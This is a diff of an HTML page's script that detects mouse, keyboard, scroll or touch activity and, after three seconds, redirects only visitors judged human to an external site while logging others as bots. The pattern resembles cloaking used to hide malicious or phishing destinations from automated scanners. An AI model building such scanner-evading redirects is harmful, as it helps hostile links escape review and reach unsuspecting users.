@@ -44,24 +44,27 @@
   </style>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
+      // Set a flag to detect user interactions
       let isHuman = false;
 
-      // Detect user interactions
-      const markHuman = () => isHuman = true;
+      // Detect user interactions (mouse, keyboard, scroll, or touch)
+      const markHuman = () => {
+        isHuman = true;
+      };
       document.addEventListener("mousemove", markHuman);
       document.addEventListener("keypress", markHuman);
       document.addEventListener("scroll", markHuman);
-      document.addEventListener("focus", markHuman);
+      document.addEventListener("touchstart", markHuman);
 
-      // Extend validation window
+      // Validate and redirect after delay
       setTimeout(() => {
-        if (!isHuman) {
-          console.warn("Bot detected or invalid visit.");
-          return;
+        if (isHuman) {
+          // Redirect if the user is valid
+          window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
+        } else {
+          console.warn("Bot detected or no interaction from user.");
         }
-        // Redirect valid user
-        window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
-      }, 3000); // Increased to 5 seconds
+      }, 3000); // Adjust the delay as needed
     });
   </script>
 </head>
